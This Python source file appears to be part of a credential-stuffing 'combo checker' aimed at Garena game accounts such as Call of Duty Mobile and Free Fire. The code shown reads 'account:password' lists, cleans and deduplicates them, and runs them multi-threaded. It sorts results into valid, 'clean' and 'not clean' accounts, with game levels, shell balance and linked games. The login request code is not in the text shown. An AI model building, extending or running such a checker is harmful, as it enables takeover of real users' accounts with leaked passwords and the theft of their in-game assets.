import hashlib, json, logging, threading, random, os, re, sys, time, urllib.parse, signal, shutil, uuid, base64, io, socket
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from collections import deque
from threading import Lock, Event, Thread
import colorama
from colorama import Fore as _F, Style as _S
import requests
from Crypto.Cipher import AES
from rich import print as rprint
from rich.console import Console
from rich.live import Live
from rich.panel import Panel
from rich.progress import BarColumn, MofNCompleteColumn, Progress, SpinnerColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
from rich.table import Table
from rich.text import Text
from rich.box import Box, DOUBLE, HEAVY, ROUNDED
from rich.columns import Columns
from rich import box
from rich.prompt import Confirm
from rich.align import Align
from rich.layout import Layout
from rich.rule import Rule
from typing import Any, List, Optional, Dict, Tuple

try:
    import pyfiglet as _pyfiglet
    _HAS_FIG = True
except ImportError:
    _HAS_FIG = False

colorama.init(autoreset=True)
console = Console()
_shutil_ui = shutil

_CY = _F.CYAN + _S.BRIGHT
_GN = _F.GREEN + _S.BRIGHT
_RD = _F.RED + _S.BRIGHT
_YL = _F.YELLOW + _S.BRIGHT
_MG = _F.MAGENTA + _S.BRIGHT
_WH = _F.WHITE + _S.BRIGHT
_BLU = _F.BLUE + _S.BRIGHT
_DIM = _S.DIM
_RST = _S.RESET_ALL
_BRT = _S.BRIGHT
_ITL = "\033[3m"
_SL = "\033[38;5;240m"
_GR = "\033[38;5;114m"
_GD = "\033[38;5;222m"
P = 'bold bright_cyan'
S = 'bold bright_magenta'
OK = 'bold bright_green'
ER = 'bold bright_red'
WN = 'bold yellow'
MU = 'dim'
TX = 'bright_white'
BL = 'cyan'

def _tw():
    return _shutil_ui.get_terminal_size((80, 24)).columns

def _w(n=72):
    return min(_tw() - 4, n)

def _ts():
    return datetime.now().strftime('%H:%M:%S')

def _visible_len(text):
    import re
    return len(re.sub(r'\x1b\[[0-9;]*m', '', str(text)))

def _strip_rich(text):
    return re.sub('\\[/?[^\\]]+\\]', '', str(text))

def _log(level: str, msg: str, indent: str='  '):
    col, icon = _LOG_ICONS.get(level, (_DIM, '·'))
    clean = _strip_rich(msg)
    print(f'{indent}{col}{icon}{_RST}  {clean}')

_LOG_ICONS = {'INFO': (_CY, 'ℹ'), 'SUCCESS': (_GN, '✔'), 'WARNING': (_YL, '⚠'), 'ERROR': (_RD, '✖'), 'DEBUG': (_DIM, '·'), 'REQUEST': (_CY, '→'), 'RESPONSE': (_CY, '←'), 'RETRY': (_YL, '↺'), 'PROXY': (_MG, '⬡'), 'THREAD': (_MG, '⧫'), 'SAVE': (_GN, '⬇')}

THREAD_CONFIGS = {'1': {'threads': 1, 'label': '1  thread   — Safe, slower', 'icon': ''}, '2': {'threads': 3, 'label': '3  threads  — Balanced', 'icon': ''}, '3': {'threads': 5, 'label': '5  threads  — Fast', 'icon': ''}, '4': {'threads': 10, 'label': '10 threads  — Very fast (risk)', 'icon': ''}, '5': {'threads': 15, 'label': '15 threads  — Max speed (high risk)', 'icon': ''}}
from rich.box import Box, DOUBLE
CARD = Box('┏━━┓\n┃  ┃\n┣━━┫\n┃  ┃\n┣━━┫\n┣━━┫\n┃  ┃\n┗━━┛\n')
telegram_enabled = False
_telegram_config = None
CODM_REGIONS = {'AF':{'name':'Afghanistan','code':'93','flag':'🇦🇫'},'AL':{'name':'Albania','code':'355','flag':'🇦🇱'},'DZ':{'name':'Algeria','code':'213','flag':'🇩🇿'},'AD':{'name':'Andorra','code':'376','flag':'🇦🇩'},'AO':{'name':'Angola','code':'244','flag':'🇦🇴'},'AG':{'name':'Antigua and Barbuda','code':'1','flag':'🇦🇬'},'AR':{'name':'Argentina','code':'54','flag':'🇦🇷'},'AM':{'name':'Armenia','code':'374','flag':'🇦🇲'},'AU':{'name':'Australia','code':'61','flag':'🇦🇺'},'AT':{'name':'Austria','code':'43','flag':'🇦🇹'},'AZ':{'name':'Azerbaijan','code':'994','flag':'🇦🇿'},'BS':{'name':'Bahamas','code':'1','flag':'🇧🇸'},'BH':{'name':'Bahrain','code':'973','flag':'🇧🇭'},'BD':{'name':'Bangladesh','code':'880','flag':'🇧🇩'},'BB':{'name':'Barbados','code':'1','flag':'🇧🇧'},'BY':{'name':'Belarus','code':'375','flag':'🇧🇾'},'BE':{'name':'Belgium','code':'32','flag':'🇧🇪'},'BZ':{'name':'Belize','code':'501','flag':'🇧🇿'},'BJ':{'name':'Benin','code':'229','flag':'🇧🇯'},'BT':{'name':'Bhutan','code':'975','flag':'🇧🇹'},'BO':{'name':'Bolivia','code':'591','flag':'🇧🇴'},'BA':{'name':'Bosnia and Herzegovina','code':'387','flag':'🇧🇦'},'BW':{'name':'Botswana','code':'267','flag':'🇧🇼'},'BR':{'name':'Brazil','code':'55','flag':'🇧🇷'},'BN':{'name':'Brunei','code':'673','flag':'🇧🇳'},'BG':{'name':'Bulgaria','code':'359','flag':'🇧🇬'},'BF':{'name':'Burkina Faso','code':'226','flag':'🇧🇫'},'BI':{'name':'Burundi','code':'257','flag':'🇧🇮'},'KH':{'name':'Cambodia','code':'855','flag':'🇰🇭'},'CM':{'name':'Cameroon','code':'237','flag':'🇨🇲'},'CA':{'name':'Canada','code':'1','flag':'🇨🇦'},'CV':{'name':'Cape Verde','code':'238','flag':'🇨🇻'},'CF':{'name':'Central African Republic','code':'236','flag':'🇨🇫'},'TD':{'name':'Chad','code':'235','flag':'🇹🇩'},'CL':{'name':'Chile','code':'56','flag':'🇨🇱'},'CN':{'name':'China','code':'86','flag':'🇨🇳'},'CO':{'name':'Colombia','code':'57','flag':'🇨🇴'},'KM':{'name':'Comoros','code':'269','flag':'🇰🇲'},'CG':{'name':'Congo','code':'242','flag':'🇨🇬'},'CD':{'name':'Congo (DRC)','code':'243','flag':'🇨🇩'},'CR':{'name':'Costa Rica','code':'506','flag':'🇨🇷'},'CI':{'name':"Côte d'Ivoire",'code':'225','flag':'🇨🇮'},'HR':{'name':'Croatia','code':'385','flag':'🇭🇷'},'CU':{'name':'Cuba','code':'53','flag':'🇨🇺'},'CY':{'name':'Cyprus','code':'357','flag':'🇨🇾'},'CZ':{'name':'Czech Republic','code':'420','flag':'🇨🇿'},'DK':{'name':'Denmark','code':'45','flag':'🇩🇰'},'DJ':{'name':'Djibouti','code':'253','flag':'🇩🇯'},'DM':{'name':'Dominica','code':'1','flag':'🇩🇲'},'DO':{'name':'Dominican Republic','code':'1','flag':'🇩🇴'},'EC':{'name':'Ecuador','code':'593','flag':'🇪🇨'},'EG':{'name':'Egypt','code':'20','flag':'🇪🇬'},'SV':{'name':'El Salvador','code':'503','flag':'🇸🇻'},'GQ':{'name':'Equatorial Guinea','code':'240','flag':'🇬🇶'},'ER':{'name':'Eritrea','code':'291','flag':'🇪🇷'},'EE':{'name':'Estonia','code':'372','flag':'🇪🇪'},'SZ':{'name':'Eswatini','code':'268','flag':'🇸🇿'},'ET':{'name':'Ethiopia','code':'251','flag':'🇪🇹'},'FJ':{'name':'Fiji','code':'679','flag':'🇫🇯'},'FI':{'name':'Finland','code':'358','flag':'🇫🇮'},'FR':{'name':'France','code':'33','flag':'🇫🇷'},'GA':{'name':'Gabon','code':'241','flag':'🇬🇦'},'GM':{'name':'Gambia','code':'220','flag':'🇬🇲'},'GE':{'name':'Georgia','code':'995','flag':'🇬🇪'},'DE':{'name':'Germany','code':'49','flag':'🇩🇪'},'GH':{'name':'Ghana','code':'233','flag':'🇬🇭'},'GR':{'name':'Greece','code':'30','flag':'🇬🇷'},'GD':{'name':'Grenada','code':'1','flag':'🇬🇩'},'GT':{'name':'Guatemala','code':'502','flag':'🇬🇹'},'GN':{'name':'Guinea','code':'224','flag':'🇬🇳'},'GW':{'name':'Guinea-Bissau','code':'245','flag':'🇬🇼'},'GY':{'name':'Guyana','code':'592','flag':'🇬🇾'},'HT':{'name':'Haiti','code':'509','flag':'🇭🇹'},'HN':{'name':'Honduras','code':'504','flag':'🇭🇳'},'HK':{'name':'Hong Kong','code':'852','flag':'🇭🇰'},'HU':{'name':'Hungary','code':'36','flag':'🇭🇺'},'IS':{'name':'Iceland','code':'354','flag':'🇮🇸'},'IN':{'name':'India','code':'91','flag':'🇮🇳'},'ID':{'name':'Indonesia','code':'62','flag':'🇮🇩'},'IR':{'name':'Iran','code':'98','flag':'🇮🇷'},'IQ':{'name':'Iraq','code':'964','flag':'🇮🇶'},'IE':{'name':'Ireland','code':'353','flag':'🇮🇪'},'IL':{'name':'Israel','code':'972','flag':'🇮🇱'},'IT':{'name':'Italy','code':'39','flag':'🇮🇹'},'JM':{'name':'Jamaica','code':'1','flag':'🇯🇲'},'JP':{'name':'Japan','code':'81','flag':'🇯🇵'},'JO':{'name':'Jordan','code':'962','flag':'🇯🇴'},'KZ':{'name':'Kazakhstan','code':'7','flag':'🇰🇿'},'KE':{'name':'Kenya','code':'254','flag':'🇰🇪'},'KI':{'name':'Kiribati','code':'686','flag':'🇰🇮'},'KR':{'name':'South Korea','code':'82','flag':'🇰🇷'},'KW':{'name':'Kuwait','code':'965','flag':'🇰🇼'},'KG':{'name':'Kyrgyzstan','code':'996','flag':'🇰🇬'},'LA':{'name':'Laos','code':'856','flag':'🇱🇦'},'LV':{'name':'Latvia','code':'371','flag':'🇱🇻'},'LB':{'name':'Lebanon','code':'961','flag':'🇱🇧'},'LS':{'name':'Lesotho','code':'266','flag':'🇱🇸'},'LR':{'name':'Liberia','code':'231','flag':'🇱🇷'},'LY':{'name':'Libya','code':'218','flag':'🇱🇾'},'LI':{'name':'Liechtenstein','code':'423','flag':'🇱🇮'},'LT':{'name':'Lithuania','code':'370','flag':'🇱🇹'},'LU':{'name':'Luxembourg','code':'352','flag':'🇱🇺'},'MO':{'name':'Macau','code':'853','flag':'🇲🇴'},'MG':{'name':'Madagascar','code':'261','flag':'🇲🇬'},'MW':{'name':'Malawi','code':'265','flag':'🇲🇼'},'MY':{'name':'Malaysia','code':'60','flag':'🇲🇾'},'MV':{'name':'Maldives','code':'960','flag':'🇲🇻'},'ML':{'name':'Mali','code':'223','flag':'🇲🇱'},'MT':{'name':'Malta','code':'356','flag':'🇲🇹'},'MH':{'name':'Marshall Islands','code':'692','flag':'🇲🇭'},'MR':{'name':'Mauritania','code':'222','flag':'🇲🇷'},'MU':{'name':'Mauritius','code':'230','flag':'🇲🇺'},'MX':{'name':'Mexico','code':'52','flag':'🇲🇽'},'FM':{'name':'Micronesia','code':'691','flag':'🇫🇲'},'MD':{'name':'Moldova','code':'373','flag':'🇲🇩'},'MC':{'name':'Monaco','code':'377','flag':'🇲🇨'},'MN':{'name':'Mongolia','code':'976','flag':'🇲🇳'},'ME':{'name':'Montenegro','code':'382','flag':'🇲🇪'},'MA':{'name':'Morocco','code':'212','flag':'🇲🇦'},'MZ':{'name':'Mozambique','code':'258','flag':'🇲🇿'},'MM':{'name':'Myanmar','code':'95','flag':'🇲🇲'},'NA':{'name':'Namibia','code':'264','flag':'🇳🇦'},'NR':{'name':'Nauru','code':'674','flag':'🇳🇷'},'NP':{'name':'Nepal','code':'977','flag':'🇳🇵'},'NL':{'name':'Netherlands','code':'31','flag':'🇳🇱'},'NZ':{'name':'New Zealand','code':'64','flag':'🇳🇿'},'NI':{'name':'Nicaragua','code':'505','flag':'🇳🇮'},'NE':{'name':'Niger','code':'227','flag':'🇳🇪'},'NG':{'name':'Nigeria','code':'234','flag':'🇳🇬'},'MK':{'name':'North Macedonia','code':'389','flag':'🇲🇰'},'NO':{'name':'Norway','code':'47','flag':'🇳🇴'},'OM':{'name':'Oman','code':'968','flag':'🇴🇲'},'PK':{'name':'Pakistan','code':'92','flag':'🇵🇰'},'PW':{'name':'Palau','code':'680','flag':'🇵🇼'},'PA':{'name':'Panama','code':'507','flag':'🇵🇦'},'PG':{'name':'Papua New Guinea','code':'675','flag':'🇵🇬'},'PY':{'name':'Paraguay','code':'595','flag':'🇵🇾'},'PE':{'name':'Peru','code':'51','flag':'🇵🇪'},'PH':{'name':'Philippines','code':'63','flag':'🇵🇭'},'PL':{'name':'Poland','code':'48','flag':'🇵🇱'},'PT':{'name':'Portugal','code':'351','flag':'🇵🇹'},'QA':{'name':'Qatar','code':'974','flag':'🇶🇦'},'RO':{'name':'Romania','code':'40','flag':'🇷🇴'},'RU':{'name':'Russia','code':'7','flag':'🇷🇺'},'RW':{'name':'Rwanda','code':'250','flag':'🇷🇼'},'KN':{'name':'Saint Kitts and Nevis','code':'1','flag':'🇰🇳'},'LC':{'name':'Saint Lucia','code':'1','flag':'🇱🇨'},'VC':{'name':'Saint Vincent and the Grenadines','code':'1','flag':'🇻🇨'},'WS':{'name':'Samoa','code':'685','flag':'🇼🇸'},'SM':{'name':'San Marino','code':'378','flag':'🇸🇲'},'ST':{'name':'São Tomé and Príncipe','code':'239','flag':'🇸🇹'},'SA':{'name':'Saudi Arabia','code':'966','flag':'🇸🇦'},'SN':{'name':'Senegal','code':'221','flag':'🇸🇳'},'RS':{'name':'Serbia','code':'381','flag':'🇷🇸'},'SC':{'name':'Seychelles','code':'248','flag':'🇸🇨'},'SL':{'name':'Sierra Leone','code':'232','flag':'🇸🇱'},'SG':{'name':'Singapore','code':'65','flag':'🇸🇬'},'SK':{'name':'Slovakia','code':'421','flag':'🇸🇰'},'SI':{'name':'Slovenia','code':'386','flag':'🇸🇮'},'SB':{'name':'Solomon Islands','code':'677','flag':'🇸🇧'},'SO':{'name':'Somalia','code':'252','flag':'🇸🇴'},'ZA':{'name':'South Africa','code':'27','flag':'🇿🇦'},'SS':{'name':'South Sudan','code':'211','flag':'🇸🇸'},'ES':{'name':'Spain','code':'34','flag':'🇪🇸'},'LK':{'name':'Sri Lanka','code':'94','flag':'🇱🇰'},'SD':{'name':'Sudan','code':'249','flag':'🇸🇩'},'SR':{'name':'Suriname','code':'597','flag':'🇸🇷'},'SE':{'name':'Sweden','code':'46','flag':'🇸🇪'},'CH':{'name':'Switzerland','code':'41','flag':'🇨🇭'},'SY':{'name':'Syria','code':'963','flag':'🇸🇾'},'TW':{'name':'Taiwan','code':'886','flag':'🇹🇼'},'TJ':{'name':'Tajikistan','code':'992','flag':'🇹🇯'},'TZ':{'name':'Tanzania','code':'255','flag':'🇹🇿'},'TH':{'name':'Thailand','code':'66','flag':'🇹🇭'},'TL':{'name':'Timor-Leste','code':'670','flag':'🇹🇱'},'TG':{'name':'Togo','code':'228','flag':'🇹🇬'},'TO':{'name':'Tonga','code':'676','flag':'🇹🇴'},'TT':{'name':'Trinidad and Tobago','code':'1','flag':'🇹🇹'},'TN':{'name':'Tunisia','code':'216','flag':'🇹🇳'},'TR':{'name':'Turkey','code':'90','flag':'🇹🇷'},'TM':{'name':'Turkmenistan','code':'993','flag':'🇹🇲'},'TV':{'name':'Tuvalu','code':'688','flag':'🇹🇻'},'UG':{'name':'Uganda','code':'256','flag':'🇺🇬'},'UA':{'name':'Ukraine','code':'380','flag':'🇺🇦'},'AE':{'name':'United Arab Emirates','code':'971','flag':'🇦🇪'},'GB':{'name':'United Kingdom','code':'44','flag':'🇬🇧'},'US':{'name':'United States','code':'1','flag':'🇺🇸'},'UY':{'name':'Uruguay','code':'598','flag':'🇺🇾'},'UZ':{'name':'Uzbekistan','code':'998','flag':'🇺🇿'},'VU':{'name':'Vanuatu','code':'678','flag':'🇻🇺'},'VA':{'name':'Vatican City','code':'39','flag':'🇻🇦'},'VE':{'name':'Venezuela','code':'58','flag':'🇻🇪'},'VN':{'name':'Vietnam','code':'84','flag':'🇻🇳'},'YE':{'name':'Yemen','code':'967','flag':'🇾🇪'},'ZM':{'name':'Zambia','code':'260','flag':'🇿🇲'},'ZW':{'name':'Zimbabwe','code':'263','flag':'🇿🇼'}}

def sanitize_string(text):
    if not text or text == 'N/A':
        return text
    try:
        return text.encode('ascii', errors='ignore').decode('ascii')
    except:
        return re.sub('[^\\x00-\\x7F]+', '', str(text))

def clean_account_line(line):
    if not line:
        return (None, None)
    line = line.strip().lstrip('\ufeff\ufffe')
    line = ''.join((char for char in line if char.isprintable() or char == ':'))
    if ':' not in line:
        return (None, None)
    try:
        parts = line.split(':', 1)
        if len(parts) != 2:
            return (None, None)
        account = parts[0].strip()
        password = parts[1].strip()
        account = sanitize_string(account)
        password = sanitize_string(password)
        if not account or not password:
            return (None, None)
        return (account, password)
    except:
        return (None, None)

def format_codm_region(region_code):
    if not region_code or region_code == 'N/A':
        return 'N/A'
    region_code = region_code.upper()
    region_info = CODM_REGIONS.get(region_code)
    if region_info:
        return f"{region_info['flag']} {region_info['name']} ({region_code})"
    else:
        return f'{region_code}'

def format_mobile_number(mobile_no, country_code=None):
    if not mobile_no or mobile_no == 'N/A' or (not str(mobile_no).strip()):
        return 'N/A'
    mobile_str = str(mobile_no).strip()
    mobile_str = mobile_str.replace('+', '').replace(' ', '').replace('-', '')
    if country_code:
        country_code = str(country_code).strip()
        if not mobile_str.startswith(country_code):
            if mobile_str.startswith('0'):
                mobile_str = country_code + mobile_str[1:]
            else:
                mobile_str = country_code + mobile_str
    detected_country_code = None
    for code_key, region_info in CODM_REGIONS.items():
        code = region_info['code']
        if mobile_str.startswith(code):
            detected_country_code = code
            break
    if detected_country_code:
        local_number = mobile_str[len(detected_country_code):]
        if len(local_number) >= 4:
            masked = '*' * (len(local_number) - 4) + local_number[-4:]
            return f'+{detected_country_code} {masked}'
        else:
            return f'+{detected_country_code} {local_number}'
    elif len(mobile_str) >= 4:
        masked = '*' * (len(mobile_str) - 4) + mobile_str[-4:]
        return f'+{masked}'
    else:
        return mobile_str

def _sigint_handler(sig, frame):
    print(f'\n  {_YL}⚠  Ctrl+C – exiting immediately…{_RST}')
    os._exit(0)
signal.signal(signal.SIGINT, _sigint_handler)

class ColoredFormatter(logging.Formatter):
    COLORS = {'DEBUG': colorama.Fore.CYAN, 'INFO': colorama.Fore.CYAN, 'WARNING': colorama.Fore.YELLOW, 'ERROR': colorama.Fore.RED, 'CRITICAL': colorama.Fore.RED + colorama.Back.BLACK + colorama.Style.BRIGHT}
    ICONS = {'DEBUG': '⊡', 'INFO': 'ℹ', 'WARNING': '⚠', 'ERROR': '✖', 'CRITICAL': '☠'}
    RESET = colorama.Style.RESET_ALL

    def format(self, record):
        levelname = record.levelname
        color = self.COLORS.get(levelname, '')
        icon = self.ICONS.get(levelname, '·')
        tag = f'{levelname:<8}'
        if color:
            record.msg = f'{color}{icon} {tag}{self.RESET} {record.msg}'
        return super().format(record)

logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.INFO)
logging.getLogger('urllib3').setLevel(logging.ERROR)
logging.getLogger('requests').setLevel(logging.ERROR)

DEFAULT_THREADS = 5
CHECK_OTHER_GAMES: bool = False
GAME_FILE_MAP = {'CODM': 'CODM.txt', 'FREEFIRE': 'FreeFire.txt', 'FREE FIRE': 'FreeFire.txt', 'ROV': 'ROV.txt', 'DELTA FORCE': 'DeltaForce.txt', 'AOV': 'AOV.txt', 'SPEED DRIFTERS': 'SpeedDrifters.txt', 'BLACK CLOVER M': 'BlackCloverM.txt', 'GARENA UNDAWN': 'Undawn.txt', 'FC ONLINE': 'FCOnline.txt', 'FC ONLINE M': 'FCOnlineM.txt', 'MOONLIGHT BLADE': 'MoonlightBlade.txt', 'FAST THRILL': 'FastThrill.txt', 'THE WORLD OF WAR': 'WorldOfWar.txt'}
GAME_DISPLAY_NAMES = [('CODM', 'CODM'), ('FREEFIRE', 'Free Fire'), ('ROV', 'ROV'), ('DELTA FORCE', 'Delta Force'), ('AOV', 'AOV'), ('SPEED DRIFTERS', 'Speed Drifters'), ('BLACK CLOVER M', 'Black Clover M'), ('GARENA UNDAWN', 'Undawn'), ('FC ONLINE', 'FC Online'), ('FC ONLINE M', 'FC Online M'), ('MOONLIGHT BLADE', 'Moonlight Blade'), ('FAST THRILL', 'Fast Thrill'), ('THE WORLD OF WAR', 'World of War')]
OAUTH_MAX_RETRIES = 3
OAUTH_RETRY_DELAY = 2

class AccountFileManager:

    def __init__(self, combo_folder='Combo'):
        self.combo_folder = Path(combo_folder)
        self.combo_folder.mkdir(exist_ok=True)
        self._file_lock = threading.Lock()

    def scan_combo_folder(self):
        return list(self.combo_folder.glob('*.txt'))

    def get_file_info(self, file_path):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip() and ':' in line]
                account_count = len(lines)
            file_size = file_path.stat().st_size
            return {'name': file_path.name, 'path': str(file_path), 'size': file_size, 'size_str': self._format_size(file_size), 'account_count': account_count}
        except Exception as e:
            logger.error(f'Error reading file {file_path}')
            return None

    def _format_size(self, size_bytes):
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size_bytes < 1024.0:
                return f'{size_bytes:.2f} {unit}'
            size_bytes /= 1024.0
        return f'{size_bytes:.2f} TB'

    def clean_file_encoding(self, file_path):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            cleaned_lines = []
            invalid_count = 0
            for line in lines:
                account, password = clean_account_line(line)
                if account and password:
                    cleaned_lines.append(f'{account}:{password}\n')
                else:
                    invalid_count += 1
            with open(file_path, 'w', encoding='utf-8') as f:
                f.writelines(cleaned_lines)
            return (len(cleaned_lines), invalid_count)
        except Exception as e:
            logger.error(f'Error cleaning file encoding')
            return (0, 0)

    def clean_duplicates(self, file_path, overwrite=True):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip()]
            original_count = len(lines)
            unique_lines = list(dict.fromkeys(lines))
            duplicates_removed = original_count - len(unique_lines)
            if overwrite:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(unique_lines))
            else:
                new_path = file_path.parent / f'{file_path.stem}_cleaned.txt'
                with open(new_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(unique_lines))
            return duplicates_removed
        except Exception as e:
            logger.error(f'Error cleaning duplicates')
            return 0

    def remove_line_from_file(self, file_path, line_to_remove):
        try:
            file_path = Path(file_path)
            target = line_to_remove.strip()
            with self._file_lock:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()
                with open(file_path, 'w', encoding='utf-8') as f:
                    for line in lines:
                        if line.strip() != target:
                            f.write(line)
            return True
        except Exception as e:
            logger.error(f'Error removing line')
            return False

class AccountFileViewer:
    def __init__(self):
        self.console = Console()

    def display_file_table(self, file_infos):
        table = Table(title="📊  COMBO FILES", title_style="bold cyan", box=box.ROUNDED, border_style="cyan", header_style="bold dim", expand=False, padding=(0, 1))
        table.add_column("#", justify="right", style="cyan", no_wrap=True)
        table.add_column("Filename", style="white", overflow="fold")
        table.add_column("Size", justify="left", style="yellow")
        table.add_column("Accounts", justify="right", style="green")
        table.add_column("Bar", no_wrap=True)
        max_ac = max((i["account_count"] for i in file_infos)) if file_infos else 1
        for idx, info in enumerate(file_infos, 1):
            filled = int(info["account_count"] / max_ac * 16) if max_ac else 0
            bar = Text()
            bar.append("█" * filled, style="cyan")
            bar.append("░" * (16 - filled), style="dim")
            table.add_row(str(idx), info["name"], info["size_str"], f"{info['account_count']:,}", bar)
        self.console.print()
        self.console.print(table)
        self.console.print()

    def prompt_file_selection(self, file_infos):
        self.console.print("  [dim]Enter file number or [cyan]'auto'[/cyan][dim] to pick largest[/dim]\n")
        while True:
            choice = input(f"  {_CY}❯{_RST} ").strip().lower()
            if choice == "auto":
                largest = max(file_infos, key=lambda x: x["account_count"])
                self.console.print(f"  [green]✔[/green] Auto-selected: [white]{largest['name']}[/white]")
                return largest["path"]
            try:
                idx = int(choice)
                if 1 <= idx <= len(file_infos):
                    return file_infos[idx - 1]["path"]
                self.console.print("  [red]✘[/red] Invalid number — try again.")
            except ValueError:
                self.console.print("  [red]✘[/red] Enter a number or 'auto'.")

    def prompt_clean_file(self):
        return Confirm.ask("  [yellow]?[/yellow]  [white]Clean file encoding?[/white]", default=True)

    def prompt_remove_duplicates(self):
        return Confirm.ask("  [yellow]?[/yellow]  [white]Remove duplicate lines?[/white]", default=False)

    def prompt_auto_remove_checked(self):
        return Confirm.ask("  [yellow]?[/yellow]  [white]Auto-remove checked lines?[/white]", default=False)

class LiveStats:
    def __init__(self):
        self.valid_count = self.invalid_count = self.clean_count = self.not_clean_count = 0
        self.has_codm_count = self.no_codm_count = self.error_count = 0
        self.highest_clean_level = self.highest_not_clean_level = self.highest_shell = 0
        self.clean_level_counts = {'351-400':0,'201-350':0,'101-200':0,'1-100':0}
        self.not_clean_level_counts = {'351-400':0,'201-350':0,'101-200':0,'1-100':0}
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.total_accounts = 0
        self.game_counts = {k:0 for k,_ in GAME_DISPLAY_NAMES}
        self.last_result_queue = deque(maxlen=200)

    def update_stats(self, valid=False, clean=False, has_codm=False, is_error=False, codm_level=0, game_connections=None, shell=0):
        with self.lock:
            if is_error:
                self.error_count += 1
            elif valid:
                self.valid_count += 1
                if clean:
                    self.clean_count += 1
                    if codm_level > self.highest_clean_level:
                        self.highest_clean_level = codm_level
                    if has_codm and codm_level > 0:
                        if codm_level <= 100:
                            self.clean_level_counts['1-100'] += 1
                        elif codm_level <= 200:
                            self.clean_level_counts['101-200'] += 1
                        elif codm_level <= 300:
                            self.clean_level_counts['201-350'] += 1
                        else:
                            self.clean_level_counts['351-400'] += 1
                else:
                    self.not_clean_count += 1
                    if has_codm and codm_level > 0:
                        if codm_level > self.highest_not_clean_level:
                            self.highest_not_clean_level = codm_level
                        if codm_level <= 100:
                            self.not_clean_level_counts['1-100'] += 1
                        elif codm_level <= 200:
                            self.not_clean_level_counts['101-200'] += 1
                        elif codm_level <= 350:
                            self.not_clean_level_counts['201-350'] += 1
                        else:
                            self.not_clean_level_counts['351-400'] += 1
                if has_codm:
                    self.has_codm_count += 1
                else:
                    self.no_codm_count += 1
                try:
                    if int(shell or 0) > self.highest_shell:
                        self.highest_shell = int(shell or 0)
                except:
                    pass
                for g in game_connections or []:
                    gname = g.get('game','').upper()
                    if gname == 'FREE FIRE':
                        gname = 'FREEFIRE'
                    if gname in self.game_counts:
                        self.game_counts[gname] += 1
            else:
                self.invalid_count += 1

    def get_stats(self):
        with self.lock:
            return {'valid':self.valid_count,'invalid':self.invalid_count,'clean':self.clean_count,
                    'not_clean':self.not_clean_count,'has_codm':self.has_codm_count,
                    'no_codm':self.no_codm_count,'error':self.error_count,
                    'highest_clean_level':self.highest_clean_level,
                    'clean_level_counts':dict(self.clean_level_counts),
                    'not_clean_level_counts':dict(self.not_clean_level_counts),
                    'game_counts':dict(self.game_counts),'highest_shell':self.highest_shell}

    def get_processed_count(self):
        with self.lock:
            return self.valid_count + self.invalid_count + self.error_count

    def push_result(self, success: bool, is_clean: bool = False, has_codm: bool = False, codm_level: int = 0, error_reason: str = '', shell_balance: int = 0):
        with self.lock:
            self.last_result_queue.append({'success':success,'is_clean':is_clean,'has_codm':has_codm,'codm_level':codm_level,'error_reason':error_reason,'shell_balance':shell_balance})

    def pop_result(self):
        with self.lock:
            return self.last_result_queue.popleft() if self.last_result_queue else None

    def _rich_bar(self, count: int, denom: int, color: str, width: int = 20) -> Text:
        if denom == 0:
            return Text("░" * width, style="dim")
        filled = int(count / denom * width)
        bar = Text()
        bar.append("█" * filled, style=color)
        bar.append("░" * (width - filled), style="dim")
        return bar

    def _rich_pct(self, count: int, denom: int) -> str:
        return f"{count / denom * 100:.1f}%" if denom > 0 else "0.0%"

    def display_stats(self):
        stats = self.get_stats()
        processed = self.get_processed_count()
        if processed == 0:
            return ''
        elapsed = time.time() - self.start_time
        rate = processed / elapsed if elapsed > 0 else 0
        remaining = self.total_accounts - processed
        eta = remaining / rate if rate > 0 else 0
        pct = processed / self.total_accounts * 100 if self.total_accounts > 0 else 0
        bar_w = 30
        filled = int(pct / 100 * bar_w)
        prog_bar = f"[bright_cyan]{'█' * filled}[/bright_cyan][dim]{'░' * (bar_w - filled)}[/dim]"

        def _mb(count, total, color, w=12):
            if total == 0:
                return f"[dim]{'░' * w}[/dim]"
            f2 = int(count / total * w)
            return f"[{color}]{'█' * f2}{'░' * (w - f2)}[/{color}]"

        tbl = Table(show_header=False, box=None, padding=(0, 1), expand=False)
        tbl.add_column(style='dim', min_width=6, no_wrap=True)
        tbl.add_column(style='bright_white', min_width=8, no_wrap=True, justify='right')
        tbl.add_column(style='dim', min_width=14, no_wrap=True)
        tbl.add_row(f'[bright_cyan]{prog_bar}[/bright_cyan]', f'[bold bright_yellow]{pct:.1f}%[/bold bright_yellow]', f'[dim]{processed}/{self.total_accounts}  ·  {rate:.1f}/s  ·  ETA {int(eta // 60)}m{int(eta % 60)}s[/dim]')
        tbl.add_row('', '', '')
        total_c = stats['valid'] + stats['invalid']
        tbl.add_row(f'[bright_green]✔ Valid[/bright_green]', f"[bright_green]{stats['valid']}[/bright_green]", _mb(stats['valid'], total_c, 'bright_green'))
        tbl.add_row(f'[bright_red]✖ Invalid[/bright_red]', f"[bright_red]{stats['invalid']}[/bright_red]", _mb(stats['invalid'], total_c, 'bright_red'))
        tbl.add_row(f'[bright_green]✨ Clean[/bright_green]', f"[bright_green]{stats['clean']}[/bright_green]", _mb(stats['clean'], max(stats['valid'], 1), 'bright_green'))
        tbl.add_row(f'[yellow]⊘ Not Clean[/yellow]', f"[yellow]{stats['not_clean']}[/yellow]", _mb(stats['not_clean'], max(stats['valid'], 1), 'yellow'))
        tbl.add_row(f'[bright_cyan]◈ CODM[/bright_cyan]', f"[bright_cyan]{stats['has_codm']}[/bright_cyan]", _mb(stats['has_codm'], max(stats['valid'], 1), 'bright_cyan'))
